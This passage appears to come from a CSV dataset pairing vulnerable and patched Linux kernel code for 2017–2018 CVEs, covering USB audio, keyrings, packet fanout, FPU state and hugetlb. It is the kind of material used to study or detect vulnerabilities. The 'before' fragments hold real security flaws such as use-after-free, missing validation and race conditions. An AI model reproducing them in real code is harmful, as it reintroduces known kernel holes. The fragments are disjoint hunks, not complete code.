 return -EINVAL;
	}

	rest_bytes = (void *)(host_iface->extra + host_iface->extralen) -
		control_header;

 /* just to be sure -- this shouldn't hit at all */
 if (rest_bytes <= 0) {
 dev_err(&dev->dev, ""invalid control header\n"");
 return -EINVAL;
	}

 switch (protocol) {
 default:
 dev_warn(&dev->dev,
 case UAC_VERSION_1: {
 struct uac1_ac_header_descriptor *h1 = control_header;

 if (rest_bytes < sizeof(*h1)) {
 dev_err(&dev->dev, ""too short v1 buffer descriptor\n"");
 return -EINVAL;
		}

 if (!h1->bInCollection) {
 dev_info(&dev->dev, ""skipping empty audio interface (v1)\n"");
 return -EINVAL;
		}

 if (rest_bytes < h1->bLength) {
 dev_err(&dev->dev, ""invalid buffer length (v1)\n"");
 return -EINVAL;
		}

 if (h1->bLength < sizeof(*h1) + h1->bInCollection) {
 dev_err(&dev->dev, ""invalid UAC_HEADER (v1)\n"");
 return -EINVAL;
"
2017,DoS ,CVE-2017-16528," flush_work(&autoload_work);
}
EXPORT_SYMBOL(snd_seq_device_load_drivers);

#else
#define queue_autoload_drivers() /* NOP */

#endif

/*
{
 struct snd_seq_device *dev = device->device_data;


 put_device(&dev->dev);
 return 0;
}
"," flush_work(&autoload_work);
}
EXPORT_SYMBOL(snd_seq_device_load_drivers);
#define cancel_autoload_drivers()	cancel_work_sync(&autoload_work)
#else
#define queue_autoload_drivers() /* NOP */
#define cancel_autoload_drivers() /* NOP */
#endif

/*
{
 struct snd_seq_device *dev = device->device_data;

 cancel_autoload_drivers();
 put_device(&dev->dev);
 return 0;
}
"
2017,DoS ,CVE-2017-16527,"
static void snd_usb_mixer_free(struct usb_mixer_interface *mixer)
{



 kfree(mixer->id_elems);
 if (mixer->urb) {
 kfree(mixer->urb->transfer_buffer);

void snd_usb_mixer_disconnect(struct usb_mixer_interface *mixer)
{
 usb_kill_urb(mixer->urb);
 usb_kill_urb(mixer->rc_urb);





}

#ifdef CONFIG_PM
 struct urb *rc_urb;
 struct usb_ctrlrequest *rc_setup_packet;
	u8 rc_buffer[6];


};

#define MAX_CHANNELS 16 /* max logical channels */
","
static void snd_usb_mixer_free(struct usb_mixer_interface *mixer)
{
 /* kill pending URBs */
 snd_usb_mixer_disconnect(mixer);

 kfree(mixer->id_elems);
 if (mixer->urb) {
 kfree(mixer->urb->transfer_buffer);

void snd_usb_mixer_disconnect(struct usb_mixer_interface *mixer)
{
 if (mixer->disconnected)
 return;
 if (mixer->urb)
 usb_kill_urb(mixer->urb);
 if (mixer->rc_urb)
 usb_kill_urb(mixer->rc_urb);
	mixer->disconnected = true;
}

#ifdef CONFIG_PM
 struct urb *rc_urb;
 struct usb_ctrlrequest *rc_setup_packet;
	u8 rc_buffer[6];

 bool disconnected;
};

#define MAX_CHANNELS 16 /* max logical channels */
"
2017,DoS Overflow ,CVE-2017-16526,"/** Start the UWB daemon */
void uwbd_start(struct uwb_rc *rc)
{
	rc->uwbd.task = kthread_run(uwbd, rc, ""uwbd"");
 if (rc->uwbd.task == NULL)

 printk(KERN_ERR ""UWB: Cannot start management daemon; ""
 ""UWB won't work\n"");
 else

		rc->uwbd.pid = rc->uwbd.task->pid;

}

/* Stop the UWB daemon and free any unprocessed events */
void uwbd_stop(struct uwb_rc *rc)
{
 kthread_stop(rc->uwbd.task);

 uwbd_flush(rc);
}

","/** Start the UWB daemon */
void uwbd_start(struct uwb_rc *rc)
{
 struct task_struct *task = kthread_run(uwbd, rc, ""uwbd"");
 if (IS_ERR(task)) {
		rc->uwbd.task = NULL;
 printk(KERN_ERR ""UWB: Cannot start management daemon; ""
 ""UWB won't work\n"");
	} else {
		rc->uwbd.task = task;
		rc->uwbd.pid = rc->uwbd.task->pid;
	}
}

/* Stop the UWB daemon and free any unprocessed events */
void uwbd_stop(struct uwb_rc *rc)
{
 if (rc->uwbd.task)
 kthread_stop(rc->uwbd.task);
 uwbd_flush(rc);
}

"
2017,DoS ,CVE-2017-16525," tty_kref_put(tty);
 reset_open_count:
	port->port.count = 0;

 usb_autopm_put_interface(serial->interface);
 error_get_interface:
 usb_serial_put(serial);
"," tty_kref_put(tty);
 reset_open_count:
	port->port.count = 0;
	info->port = NULL;
 usb_autopm_put_interface(serial->interface);
 error_get_interface:
 usb_serial_put(serial);
"
2017,DoS ,CVE-2017-15951," struct key_type *keytype;
};






/*****************************************************************************/
/*
 * authentication token / access credential / keyring
						 * - may not match RCU dereferenced payload
						 * - payload should contain own length
 */


#ifdef KEY_DEBUGGING
 unsigned		magic;
#define KEY_DEBUG_MAGIC 0x18273645u
#endif

 unsigned long		flags;		/* status flags (change with bitops) */
#define KEY_FLAG_INSTANTIATED 0 /* set if key has been instantiated */
#define KEY_FLAG_DEAD 1 /* set if key type has been deleted */
#define KEY_FLAG_REVOKED 2 /* set if key had been revoked */
#define KEY_FLAG_IN_QUOTA 3 /* set if key consumes quota */
#define KEY_FLAG_USER_CONSTRUCT 4 /* set if key is being constructed in userspace */
#define KEY_FLAG_NEGATIVE 5 /* set if key is negative */
#define KEY_FLAG_ROOT_CAN_CLEAR 6 /* set if key can be cleared by root without permission */
#define KEY_FLAG_INVALIDATED 7 /* set if key has been invalidated */
#define KEY_FLAG_BUILTIN 8 /* set if key is built in to the kernel */
#define KEY_FLAG_ROOT_CAN_INVAL 9 /* set if key can be invalidated by root without permission */
#define KEY_FLAG_KEEP 10 /* set if key should not be removed */
#define KEY_FLAG_UID_KEYRING 11 /* set if key is a user or user session keyring */

 /* the key type and key description string
	 * - the desc is used to match a key against search criteria
 struct list_head name_link;
 struct assoc_array keys;
		};
 int reject_error;
	};

 /* This is set on a keyring to restrict the addition of a link to a key
#define KEY_NEED_SETATTR 0x20 /* Require permission to change attributes */
#define KEY_NEED_ALL 0x3f /* All the above permissions */







/**
 * key_is_instantiated - Determine if a key has been positively instantiated
 * @key: The key to check.
 *
 * Return true if the specified key has been positively instantiated, false
 * otherwise.
 */
static inline bool key_is_instantiated(const struct key *key)





{
 return test_bit(KEY_FLAG_INSTANTIATED, &key->flags) &&
		!test_bit(KEY_FLAG_NEGATIVE, &key->flags);
}

#define dereference_key_rcu(KEY)					\
static void dns_resolver_describe(const struct key *key, struct seq_file *m)
{
 seq_puts(m, key->description);
 if (key_is_instantiated(key)) {
 int err = PTR_ERR(key->payload.data[dns_key_error]);

 if (err)

 /* clear the quota */
 key_payload_reserve(key, 0);
 if (key_is_instantiated(key) &&
	    (size_t)key->payload.data[big_key_len] > BIG_KEY_FILE_THRESHOLD)
 vfs_truncate(path, 0);
}

 seq_puts(m, key->description);

 if (key_is_instantiated(key))
 seq_printf(m, "": %zu [%s]"",
			   datalen,
			   datalen > BIG_KEY_FILE_THRESHOLD ? ""file"" : ""buff"");
 size_t datalen = prep->datalen;
 int ret = 0;

 if (test_bit(KEY_FLAG_NEGATIVE, &key->flags))
 return -ENOKEY;
 if (datalen <= 0 || datalen > 32767 || !prep->data)
 return -EINVAL;
 while (!list_empty(keys)) {
 struct key *key =
 list_entry(keys->next, struct key, graveyard_link);


 list_del(&key->graveyard_link);

 kdebug(""- %u"", key->serial);
 key_check(key);

 /* Throw away the key data if the key is instantiated */
 if (test_bit(KEY_FLAG_INSTANTIATED, &key->flags) &&
		    !test_bit(KEY_FLAG_NEGATIVE, &key->flags) &&
		    key->type->destroy)
			key->type->destroy(key);

 security_key_free(key);
		}

 atomic_dec(&key->user->nkeys);
 if (test_bit(KEY_FLAG_INSTANTIATED, &key->flags))
 atomic_dec(&key->user->nikeys);

 key_user_put(key->user);
}
EXPORT_SYMBOL(key_payload_reserve);













/*
 * Instantiate a key and link it into the target keyring atomically.  Must be
 * called with the target keyring's semaphore writelocked.  The target key's
 mutex_lock(&key_construction_mutex);

 /* can't instantiate twice */
 if (!test_bit(KEY_FLAG_INSTANTIATED, &key->flags)) {
 /* instantiate the key */
		ret = key->type->instantiate(key, prep);

 if (ret == 0) {
 /* mark the key as being instantiated */
 atomic_inc(&key->user->nikeys);
 set_bit(KEY_FLAG_INSTANTIATED, &key->flags);

 if (test_and_clear_bit(KEY_FLAG_USER_CONSTRUCT, &key->flags))
				awaken = 1;
 mutex_lock(&key_construction_mutex);

 /* can't instantiate twice */
 if (!test_bit(KEY_FLAG_INSTANTIATED, &key->flags)) {
 /* mark the key as being negatively instantiated */
 atomic_inc(&key->user->nikeys);
		key->reject_error = -error;
 smp_wmb();
 set_bit(KEY_FLAG_NEGATIVE, &key->flags);
 set_bit(KEY_FLAG_INSTANTIATED, &key->flags);
		now = current_kernel_time();
		key->expiry = now.tv_sec + timeout;
 key_schedule_gc(key->expiry + key_gc_delay);

	ret = key->type->update(key, prep);
 if (ret == 0)
 /* updating a negative key instantiates it */
 clear_bit(KEY_FLAG_NEGATIVE, &key->flags);

 up_write(&key->sem);


	ret = key->type->update(key, &prep);
 if (ret == 0)
 /* updating a negative key instantiates it */
 clear_bit(KEY_FLAG_NEGATIVE, &key->flags);

 up_write(&key->sem);


	key = key_ref_to_ptr(key_ref);

 if (test_bit(KEY_FLAG_NEGATIVE, &key->flags)) {
		ret = -ENOKEY;
 goto error2;
	}

 /* see if we can read it directly */
	ret = key_permission(key_ref, KEY_NEED_READ);
 atomic_dec(&key->user->nkeys);
 atomic_inc(&newowner->nkeys);

 if (test_bit(KEY_FLAG_INSTANTIATED, &key->flags)) {
 atomic_dec(&key->user->nikeys);
 atomic_inc(&newowner->nikeys);
		}
 else
 seq_puts(m, ""[anon]"");

 if (key_is_instantiated(keyring)) {
 if (keyring->keys.nr_leaves_on_tree != 0)
 seq_printf(m, "": %lu"", keyring->keys.nr_leaves_on_tree);
 else
{
 struct keyring_search_context *ctx = iterator_data;
 const struct key *key = keyring_ptr_to_key(object);
 unsigned long kflags = key->flags;


 kenter(""{%d}"", key->serial);


 if (ctx->flags & KEYRING_SEARCH_DO_STATE_CHECK) {
 /* we set a different error code if we pass a negative key */
 if (kflags & (1 << KEY_FLAG_NEGATIVE)) {
 smp_rmb();
			ctx->result = ERR_PTR(key->reject_error);
 kleave("" = %d [neg]"", ctx->skipped_ret);
 goto skipped;
		}
 unsigned long timo;
 key_ref_t key_ref, skey_ref;
 char xbuf[16];

 int rc;

 struct keyring_search_context ctx = {
 sprintf(xbuf, ""%luw"", timo / (60*60*24*7));
	}



#define showflag(KEY, LETTER, FLAG) \
	(test_bit(FLAG,	&(KEY)->flags) ? LETTER : '-')

 seq_printf(m, ""%08x %c%c%c%c%c%c%c %5d %4s %08x %5d %5d %-9.9s "",
		   key->serial,
 showflag(key, 'I', KEY_FLAG_INSTANTIATED),
 showflag(key, 'R', KEY_FLAG_REVOKED),
 showflag(key, 'D', KEY_FLAG_DEAD),
 showflag(key, 'Q', KEY_FLAG_IN_QUOTA),
 showflag(key, 'U', KEY_FLAG_USER_CONSTRUCT),
 showflag(key, 'N', KEY_FLAG_NEGATIVE),
 showflag(key, 'i', KEY_FLAG_INVALIDATED),
 refcount_read(&key->usage),
		   xbuf,

	ret = -EIO;
 if (!(lflags & KEY_LOOKUP_PARTIAL) &&
 !test_bit(KEY_FLAG_INSTANTIATED, &key->flags))
 goto invalid_key;

 /* check the permissions */
			  intr ? TASK_INTERRUPTIBLE : TASK_UNINTERRUPTIBLE);
 if (ret)
 return -ERESTARTSYS;
 if (test_bit(KEY_FLAG_NEGATIVE, &key->flags)) {
 smp_rmb();
 return key->reject_error;
	}
 return key_validate(key);
}
EXPORT_SYMBOL(wait_for_key_construction);

 seq_puts(m, ""key:"");
 seq_puts(m, key->description);
 if (key_is_instantiated(key))
 seq_printf(m, "" pid:%d ci:%zu"", rka->pid, rka->callout_len);
}

 char *datablob;
 int ret = 0;

 if (test_bit(KEY_FLAG_NEGATIVE, &key->flags))
 return -ENOKEY;
	p = key->payload.data[0];
 if (!p->migratable)

 /* attach the new data, displacing the old */
	key->expiry = prep->expiry;
 if (!test_bit(KEY_FLAG_NEGATIVE, &key->flags))
		zap = dereference_key_locked(key);
 rcu_assign_keypointer(key, prep->payload.data[0]);
	prep->payload.data[0] = NULL;
void user_describe(const struct key *key, struct seq_file *m)
{
 seq_puts(m, key->description);
 if (key_is_instantiated(key))
 seq_printf(m, "": %u"", key->datalen);
}

"," struct key_type *keytype;
};

enum key_state {
	KEY_IS_UNINSTANTIATED,
	KEY_IS_POSITIVE,		/* Positively instantiated */
};

/*****************************************************************************/
/*
 * authentication token / access credential / keyring
						 * - may not match RCU dereferenced payload
						 * - payload should contain own length
 */
 short			state;		/* Key state (+) or rejection error (-) */

#ifdef KEY_DEBUGGING
 unsigned		magic;
#define KEY_DEBUG_MAGIC 0x18273645u
#endif

 unsigned long		flags;		/* status flags (change with bitops) */
#define KEY_FLAG_DEAD 0 /* set if key type has been deleted */
#define KEY_FLAG_REVOKED 1 /* set if key had been revoked */
#define KEY_FLAG_IN_QUOTA 2 /* set if key consumes quota */
#define KEY_FLAG_USER_CONSTRUCT 3 /* set if key is being constructed in userspace */
#define KEY_FLAG_ROOT_CAN_CLEAR 4 /* set if key can be cleared by root without permission */
#define KEY_FLAG_INVALIDATED 5 /* set if key has been invalidated */
#define KEY_FLAG_BUILTIN 6 /* set if key is built in to the kernel */
#define KEY_FLAG_ROOT_CAN_INVAL 7 /* set if key can be invalidated by root without permission */
#define KEY_FLAG_KEEP 8 /* set if key should not be removed */
#define KEY_FLAG_UID_KEYRING 9 /* set if key is a user or user session keyring */



 /* the key type and key description string
	 * - the desc is used to match a key against search criteria
 struct list_head name_link;
 struct assoc_array keys;
		};

	};

 /* This is set on a keyring to restrict the addition of a link to a key
#define KEY_NEED_SETATTR 0x20 /* Require permission to change attributes */
#define KEY_NEED_ALL 0x3f /* All the above permissions */

static inline short key_read_state(const struct key *key)
{
 /* Barrier versus mark_key_instantiated(). */
 return smp_load_acquire(&key->state);
}

/**
 * key_is_positive - Determine if a key has been positively instantiated
 * @key: The key to check.
 *
 * Return true if the specified key has been positively instantiated, false
 * otherwise.
 */
static inline bool key_is_positive(const struct key *key)
{
 return key_read_state(key) == KEY_IS_POSITIVE;
}

static inline bool key_is_negative(const struct key *key)
{
 return key_read_state(key) < 0;

}

#define dereference_key_rcu(KEY)					\
static void dns_resolver_describe(const struct key *key, struct seq_file *m)
{
 seq_puts(m, key->description);
 if (key_is_positive(key)) {
 int err = PTR_ERR(key->payload.data[dns_key_error]);

 if (err)

 /* clear the quota */
 key_payload_reserve(key, 0);
 if (key_is_positive(key) &&
	    (size_t)key->payload.data[big_key_len] > BIG_KEY_FILE_THRESHOLD)
 vfs_truncate(path, 0);
}

 seq_puts(m, key->description);

 if (key_is_positive(key))
 seq_printf(m, "": %zu [%s]"",
			   datalen,
			   datalen > BIG_KEY_FILE_THRESHOLD ? ""file"" : ""buff"");
 size_t datalen = prep->datalen;
 int ret = 0;

 if (key_is_negative(key))
 return -ENOKEY;
 if (datalen <= 0 || datalen > 32767 || !prep->data)
 return -EINVAL;
 while (!list_empty(keys)) {
 struct key *key =
 list_entry(keys->next, struct key, graveyard_link);
 short state = key->state;

 list_del(&key->graveyard_link);

 kdebug(""- %u"", key->serial);
 key_check(key);

 /* Throw away the key data if the key is instantiated */
 if (state == KEY_IS_POSITIVE && key->type->destroy)


			key->type->destroy(key);

 security_key_free(key);
		}

 atomic_dec(&key->user->nkeys);
 if (state != KEY_IS_UNINSTANTIATED)
 atomic_dec(&key->user->nikeys);

 key_user_put(key->user);
}
EXPORT_SYMBOL(key_payload_reserve);

/*
 * Change the key state to being instantiated.
 */
static void mark_key_instantiated(struct key *key, int reject_error)
{
 /* Commit the payload before setting the state; barrier versus
	 * key_read_state().
 */
 smp_store_release(&key->state,
			  (reject_error < 0) ? reject_error : KEY_IS_POSITIVE);
}

/*
 * Instantiate a key and link it into the target keyring atomically.  Must be
 * called with the target keyring's semaphore writelocked.  The target key's
 mutex_lock(&key_construction_mutex);

 /* can't instantiate twice */
 if (key->state == KEY_IS_UNINSTANTIATED) {
 /* instantiate the key */
		ret = key->type->instantiate(key, prep);

 if (ret == 0) {
 /* mark the key as being instantiated */
 atomic_inc(&key->user->nikeys);
 mark_key_instantiated(key, 0);

 if (test_and_clear_bit(KEY_FLAG_USER_CONSTRUCT, &key->flags))
				awaken = 1;
 mutex_lock(&key_construction_mutex);

 /* can't instantiate twice */
 if (key->state == KEY_IS_UNINSTANTIATED) {
 /* mark the key as being negatively instantiated */
 atomic_inc(&key->user->nikeys);
 mark_key_instantiated(key, -error);



		now = current_kernel_time();
		key->expiry = now.tv_sec + timeout;
 key_schedule_gc(key->expiry + key_gc_delay);

	ret = key->type->update(key, prep);
 if (ret == 0)
 /* Updating a negative key positively instantiates it */
 mark_key_instantiated(key, 0);

 up_write(&key->sem);


	ret = key->type->update(key, &prep);
 if (ret == 0)
 /* Updating a negative key positively instantiates it */
 mark_key_instantiated(key, 0);

 up_write(&key->sem);


	key = key_ref_to_ptr(key_ref);

	ret = key_read_state(key);
 if (ret < 0)
 goto error2; /* Negatively instantiated */


 /* see if we can read it directly */
	ret = key_permission(key_ref, KEY_NEED_READ);
 atomic_dec(&key->user->nkeys);
 atomic_inc(&newowner->nkeys);

 if (key->state != KEY_IS_UNINSTANTIATED) {
 atomic_dec(&key->user->nikeys);
 atomic_inc(&newowner->nikeys);
		}
 else
 seq_puts(m, ""[anon]"");

 if (key_is_positive(keyring)) {
 if (keyring->keys.nr_leaves_on_tree != 0)
 seq_printf(m, "": %lu"", keyring->keys.nr_leaves_on_tree);
 else
{
 struct keyring_search_context *ctx = iterator_data;
 const struct key *key = keyring_ptr_to_key(object);
 unsigned long kflags = READ_ONCE(key->flags);
 short state = READ_ONCE(key->state);

 kenter(""{%d}"", key->serial);


 if (ctx->flags & KEYRING_SEARCH_DO_STATE_CHECK) {
 /* we set a different error code if we pass a negative key */
 if (state < 0) {
			ctx->result = ERR_PTR(state);

 kleave("" = %d [neg]"", ctx->skipped_ret);
 goto skipped;
		}
 unsigned long timo;
 key_ref_t key_ref, skey_ref;
 char xbuf[16];
 short state;
 int rc;

 struct keyring_search_context ctx = {
 sprintf(xbuf, ""%luw"", timo / (60*60*24*7));
	}

	state = key_read_state(key);

#define showflag(KEY, LETTER, FLAG) \
	(test_bit(FLAG,	&(KEY)->flags) ? LETTER : '-')

 seq_printf(m, ""%08x %c%c%c%c%c%c%c %5d %4s %08x %5d %5d %-9.9s "",
		   key->serial,
 state != KEY_IS_UNINSTANTIATED ? 'I' : '-',
 showflag(key, 'R', KEY_FLAG_REVOKED),
 showflag(key, 'D', KEY_FLAG_DEAD),
 showflag(key, 'Q', KEY_FLAG_IN_QUOTA),
 showflag(key, 'U', KEY_FLAG_USER_CONSTRUCT),
 state < 0 ? 'N' : '-',
 showflag(key, 'i', KEY_FLAG_INVALIDATED),
 refcount_read(&key->usage),
		   xbuf,

	ret = -EIO;
 if (!(lflags & KEY_LOOKUP_PARTIAL) &&
 key_read_state(key) == KEY_IS_UNINSTANTIATED)
 goto invalid_key;

 /* check the permissions */
			  intr ? TASK_INTERRUPTIBLE : TASK_UNINTERRUPTIBLE);
 if (ret)
 return -ERESTARTSYS;
	ret = key_read_state(key);
 if (ret < 0)
 return ret;

 return key_validate(key);
}
EXPORT_SYMBOL(wait_for_key_construction);

 seq_puts(m, ""key:"");
 seq_puts(m, key->description);
 if (key_is_positive(key))
 seq_printf(m, "" pid:%d ci:%zu"", rka->pid, rka->callout_len);
}

 char *datablob;
 int ret = 0;

 if (key_is_negative(key))
 return -ENOKEY;
	p = key->payload.data[0];
 if (!p->migratable)

 /* attach the new data, displacing the old */
	key->expiry = prep->expiry;
 if (key_is_positive(key))
		zap = dereference_key_locked(key);
 rcu_assign_keypointer(key, prep->payload.data[0]);
	prep->payload.data[0] = NULL;
void user_describe(const struct key *key, struct seq_file *m)
{
 seq_puts(m, key->description);
 if (key_is_positive(key))
 seq_printf(m, "": %u"", key->datalen);
}

"
2017,#NAME?,CVE-2017-15868,"
 BT_DBG("""");




 baswap((void *) dst, &l2cap_pi(sock->sk)->chan->dst);
 baswap((void *) src, &l2cap_pi(sock->sk)->chan->src);

","
 BT_DBG("""");

 if (!l2cap_is_socket(sock))
 return -EBADFD;

 baswap((void *) dst, &l2cap_pi(sock->sk)->chan->dst);
 baswap((void *) src, &l2cap_pi(sock->sk)->chan->src);

"
2017,#NAME?,CVE-2017-15649,"
 mutex_lock(&fanout_mutex);

	err = -EINVAL;
 if (!po->running)
 goto out;

	err = -EALREADY;
 if (po->fanout)
 goto out;
 list_add(&match->list, &fanout_list);
	}
	err = -EINVAL;
 if (match->type == type &&



	    match->prot_hook.type == po->prot_hook.type &&
	    match->prot_hook.dev == po->prot_hook.dev) {
		err = -ENOSPC;
			err = 0;
		}
	}







out:
 if (err && rollover) {
 kfree(rollover);
","
 mutex_lock(&fanout_mutex);





	err = -EALREADY;
 if (po->fanout)
 goto out;
 list_add(&match->list, &fanout_list);
	}
	err = -EINVAL;

 spin_lock(&po->bind_lock);
 if (po->running &&
	    match->type == type &&
	    match->prot_hook.type == po->prot_hook.type &&
	    match->prot_hook.dev == po->prot_hook.dev) {
		err = -ENOSPC;
			err = 0;
		}
	}
 spin_unlock(&po->bind_lock);

 if (err && !refcount_read(&match->sk_ref)) {
 list_del(&match->list);
 kfree(match);
	}

out:
 if (err && rollover) {
 kfree(rollover);
"
2017,#NAME?,CVE-2017-15537,"			ret = copy_user_to_xstate(xsave, ubuf);
	} else {
		ret = user_regset_copyin(&pos, &count, &kbuf, &ubuf, xsave, 0, -1);




	}

 /*
 */
 fpu__drop(fpu);

 if (using_compacted_format())
			err = copy_user_to_xstate(&fpu->state.xsave, buf_fx);
 else
			err = __copy_from_user(&fpu->state.xsave, buf_fx, state_size);






 if (err || __copy_from_user(&env, buf, sizeof(env))) {
 fpstate_init(&fpu->state);
 trace_x86_fpu_init_state(fpu);
","			ret = copy_user_to_xstate(xsave, ubuf);
	} else {
		ret = user_regset_copyin(&pos, &count, &kbuf, &ubuf, xsave, 0, -1);

 /* xcomp_bv must be 0 when using uncompacted format */
 if (!ret && xsave->header.xcomp_bv)
			ret = -EINVAL;
	}

 /*
 */
 fpu__drop(fpu);

 if (using_compacted_format()) {
			err = copy_user_to_xstate(&fpu->state.xsave, buf_fx);
 } else {
			err = __copy_from_user(&fpu->state.xsave, buf_fx, state_size);

 /* xcomp_bv must be 0 when using uncompacted format */
 if (!err && state_size > offsetof(struct xregs_state, header) && fpu->state.xsave.header.xcomp_bv)
				err = -EINVAL;
		}

 if (err || __copy_from_user(&env, buf, sizeof(env))) {
 fpstate_init(&fpu->state);
 trace_x86_fpu_init_state(fpu);
"
2017,DoS ,CVE-2017-15306," break;
#endif
 case KVM_CAP_PPC_HTM:
		r = cpu_has_feature(CPU_FTR_TM_COMP) &&
 is_kvmppc_hv_enabled(kvm);
 break;
 default:
		r = 0;
"," break;
#endif
 case KVM_CAP_PPC_HTM:
		r = cpu_has_feature(CPU_FTR_TM_COMP) && hv_enabled;

 break;
 default:
		r = 0;
"
2017,DoS ,CVE-2017-15299,,
2017,DoS ,CVE-2017-15274," /* pull the payload in if one was supplied */
	payload = NULL;

 if (_payload) {
		ret = -ENOMEM;
		payload = kvmalloc(plen, GFP_KERNEL);
 if (!payload)

 /* pull the payload in if one was supplied */
	payload = NULL;
 if (_payload) {
		ret = -ENOMEM;
		payload = kmalloc(plen, GFP_KERNEL);
 if (!payload)
"," /* pull the payload in if one was supplied */
	payload = NULL;

 if (plen) {
		ret = -ENOMEM;
		payload = kvmalloc(plen, GFP_KERNEL);
 if (!payload)

 /* pull the payload in if one was supplied */
	payload = NULL;
 if (plen) {
		ret = -ENOMEM;
		payload = kmalloc(plen, GFP_KERNEL);
 if (!payload)
"
2017,DoS ,CVE-2017-15265," struct snd_seq_port_info *info = arg;
 struct snd_seq_client_port *port;
 struct snd_seq_port_callback *callback;


 /* it is not allowed to create the port for an another client */
 if (info->addr.client != client->number)
 return -ENOMEM;

 if (client->type == USER_CLIENT && info->kernel) {
 snd_seq_delete_port(client, port->addr.port);


 return -EINVAL;
	}
 if (client->type == KERNEL_CLIENT) {

 snd_seq_set_port_info(port, info);
 snd_seq_system_client_ev_port_start(port->addr.client, port->addr.port);


 return 0;
}
}


/* create a port, port number is returned (-1 on failure) */


struct snd_seq_client_port *snd_seq_create_port(struct snd_seq_client *client,
 int port)
{
 snd_use_lock_init(&new_port->use_lock);
 port_subs_info_init(&new_port->c_src);
 port_subs_info_init(&new_port->c_dest);


	num = port >= 0 ? port : 0;
 mutex_lock(&client->ports_mutex);
 list_add_tail(&new_port->list, &p->list);
	client->num_ports++;
	new_port->addr.port = num;	/* store the port number in the port */

 write_unlock_irqrestore(&client->ports_lock, flags);
 mutex_unlock(&client->ports_mutex);
 sprintf(new_port->name, ""port-%d"", num);

 return new_port;
}
"," struct snd_seq_port_info *info = arg;
 struct snd_seq_client_port *port;
 struct snd_seq_port_callback *callback;
 int port_idx;

 /* it is not allowed to create the port for an another client */
 if (info->addr.client != client->number)
 return -ENOMEM;

 if (client->type == USER_CLIENT && info->kernel) {
		port_idx = port->addr.port;
 snd_seq_port_unlock(port);
 snd_seq_delete_port(client, port_idx);
 return -EINVAL;
	}
 if (client->type == KERNEL_CLIENT) {

 snd_seq_set_port_info(port, info);
 snd_seq_system_client_ev_port_start(port->addr.client, port->addr.port);
 snd_seq_port_unlock(port);

 return 0;
}
}


/* create a port, port number is returned (-1 on failure);
 * the caller needs to unref the port via snd_seq_port_unlock() appropriately
 */
struct snd_seq_client_port *snd_seq_create_port(struct snd_seq_client *client,
 int port)
{
 snd_use_lock_init(&new_port->use_lock);
 port_subs_info_init(&new_port->c_src);
 port_subs_info_init(&new_port->c_dest);
 snd_use_lock_use(&new_port->use_lock);

	num = port >= 0 ? port : 0;
 mutex_lock(&client->ports_mutex);
 list_add_tail(&new_port->list, &p->list);
	client->num_ports++;
	new_port->addr.port = num;	/* store the port number in the port */
 sprintf(new_port->name, ""port-%d"", num);
 write_unlock_irqrestore(&client->ports_lock, flags);
 mutex_unlock(&client->ports_mutex);


 return new_port;
}
"
2018,Mem. Corr. ,CVE-2017-15129," spin_lock_bh(&net->nsid_lock);
	peer = idr_find(&net->netns_ids, id);
 if (peer)
 get_net(peer);
 spin_unlock_bh(&net->nsid_lock);
 rcu_read_unlock();

"," spin_lock_bh(&net->nsid_lock);
	peer = idr_find(&net->netns_ids, id);
 if (peer)
 peer = maybe_get_net(peer);
 spin_unlock_bh(&net->nsid_lock);
 rcu_read_unlock();

"
2018,DoS Overflow ,CVE-2017-15128," unsigned long src_addr,
 struct page **pagep)
{



 int vm_shared = dst_vma->vm_flags & VM_SHARED;
 struct hstate *h = hstate_vma(dst_vma);
 pte_t _dst_pte;
 __SetPageUptodate(page);
 set_page_huge_active(page);




 /*
	 * If shared, add to page cache
 */
 if (vm_shared) {
 struct address_space *mapping = dst_vma->vm_file->f_mapping;
 pgoff_t idx = vma_hugecache_offset(h, dst_vma, dst_addr);









		ret = huge_add_to_page_cache(page, mapping, idx);
 if (ret)
 goto out_release_nounlock;
	ptl = huge_pte_lockptr(h, dst_mm, dst_pte);
 spin_lock(ptl);















	ret = -EEXIST;
 if (!huge_pte_none(huge_ptep_get(dst_pte)))
 goto out_release_unlock;
"," unsigned long src_addr,
 struct page **pagep)
{
 struct address_space *mapping;
 pgoff_t idx;
 unsigned long size;
 int vm_shared = dst_vma->vm_flags & VM_SHARED;
 struct hstate *h = hstate_vma(dst_vma);
 pte_t _dst_pte;
 __SetPageUptodate(page);
 set_page_huge_active(page);

	mapping = dst_vma->vm_file->f_mapping;
	idx = vma_hugecache_offset(h, dst_vma, dst_addr);

 /*
	 * If shared, add to page cache
 */
 if (vm_shared) {
		size = i_size_read(mapping->host) >> huge_page_shift(h);
		ret = -EFAULT;
 if (idx >= size)
 goto out_release_nounlock;

 /*
		 * Serialization between remove_inode_hugepages() and
		 * huge_add_to_page_cache() below happens through the
		 * hugetlb_fault_mutex_table that here must be hold by
		 * the caller.
 */
		ret = huge_add_to_page_cache(page, mapping, idx);
 if (ret)
 goto out_release_nounlock;
	ptl = huge_pte_lockptr(h, dst_mm, dst_pte);
 spin_lock(ptl);

 /*
	 * Recheck the i_size after holding PT lock to make sure not
	 * to leave any page mapped (as page_mapped()) beyond the end
	 * of the i_size (remove_inode_hugepages() is strict about
	 * enforcing that). If we bail out here, we'll also leave a
	 * page in the radix tree in the vm_shared case beyond the end
	 * of the i_size, but remove_inode_hugepages() will take care
	 * of it as soon as we drop the hugetlb_fault_mutex_table.
 */
	size = i_size_read(mapping->host) >> huge_page_shift(h);
	ret = -EFAULT;
 if (idx >= size)
 goto out_release_unlock;

	ret = -EEXIST;
 if (!huge_pte_none(huge_ptep_get(dst_pte)))
 goto out_release_unlock;
"
2018,DoS ,CVE-2017-15127," return ret;
out_release_unlock:
 spin_unlock(ptl);
out_release_nounlock:
 if (vm_shared)
 unlock_page(page);

 put_page(page);
 goto out;
}
"," return ret;
out_release_unlock:
 spin_unlock(ptl);

 if (vm_shared)
 unlock_page(page);
out_release_nounlock:
 put_page(page);
 goto out;
}
"
2018,,CVE-2017-15126," break;
 if (ACCESS_ONCE(ctx->released) ||
 fatal_signal_pending(current)) {






 __remove_wait_queue(&ctx->event_wqh, &ewq->wq);
 if (ewq->msg.event == UFFD_EVENT_FORK) {
 struct userfaultfd_ctx *new;
					(unsigned long)
					uwq->msg.arg.reserved.reserved1;
 list_move(&uwq->wq.entry, &fork_event);






 spin_unlock(&ctx->event_wqh.lock);
				ret = 0;
 break;

 if (!ret && msg->event == UFFD_EVENT_FORK) {
		ret = resolve_userfault_fork(ctx, fork_nctx, msg);
























 if (!ret) {
 spin_lock(&ctx->event_wqh.lock);
 if (!list_empty(&fork_event)) {
				uwq = list_first_entry(&fork_event,
